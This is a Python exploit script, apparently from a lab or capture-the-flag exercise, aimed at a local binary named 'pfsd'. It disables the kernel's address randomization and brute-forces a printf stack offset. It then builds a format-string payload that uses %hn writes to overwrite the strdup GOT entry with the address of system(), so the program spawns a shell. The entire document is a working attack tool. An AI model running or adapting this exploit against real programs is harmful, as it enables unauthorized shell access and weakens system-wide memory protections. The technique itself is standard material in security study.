#! /usr/bin/env python

import subprocess
import struct
import re

# get with gdb (break main; run; print system)
# if first two bytes are (valueable) smaller then second, prevent overflow with rollover (add 1 at the beginning)
libsystem_address_first_two = 0xb7e5
libsystem_address_second_two = 0x6360

# address of strdup
target_address = 0x80496f8
first_target_address_little_endian = struct.pack("<l", target_address)
# we will have already written 2 bytes..
second_target_address_little_endian = struct.pack("<l", (target_address + 2))

# just for the output
first_target_address_string = re.sub("'", "", repr(first_target_address_little_endian))
second_target_address_string = re.sub("'", "", repr(second_target_address_little_endian))

commandtoexec = "sh;#"
binary = "./pfsd"

# address is 8 bytes wide.
already_written = len(commandtoexec) + 8

# calc how much has already been written for both jump-to-address tupels
jump_address_first_two = libsystem_address_second_two - already_written
jump_address_second_two = libsystem_address_first_two - libsystem_address_second_two

# important! Disable memory randomization
subprocess.Popen("echo 0 > /proc/sys/kernel/randomize_va_space", shell=True, stdout=subprocess.PIPE)

# i represents the offset of our input to the printf instruction on the stack 
# (i for the first and i+1 for the second), to get the offset we write arbitrary chars 
# (A and B)'s in this case; We also always clear our environment 
# (out payload must be at a consistent alignment as well as at a consistent offset on the stack
# environment is also pushed onto the stack before execution

for i in range(0, 200):
    toex = "env -i " + binary  + " \"$(python -c 'import sys; sys.stdout.write(\"sh;#AAAABBBB%00000x%"
    toex += str(i) + "$hp%00000x%" + str(i + 1) + "$hp\")')\""

    output = str(i) + ": " + subprocess.Popen(toex, shell=True, stdout=subprocess.PIPE).stdout.read()
    # hex(A) = 0x41, hex(B) = 0x42
    if "0x41414141" in output and "0x42424242" in output:
        print("\noffsets: " + str(i) + ", " + str(i + 1) + "\n")
        print("env -i " + binary + " \"$(python -c 'import sys; sys.stdout.write(\"" + commandtoexec + first_target_address_string + second_target_address_string + "%" + str(jump_address_first_two) + "x%" + str(i) + "$hn%" + str(jump_address_second_two) + "x%" + str(i + 1) + "$hn\")')\"\n")
        exit(0)

print("offset could not be found. Is randomization disabled? You can try to increase the range")
exit(1)
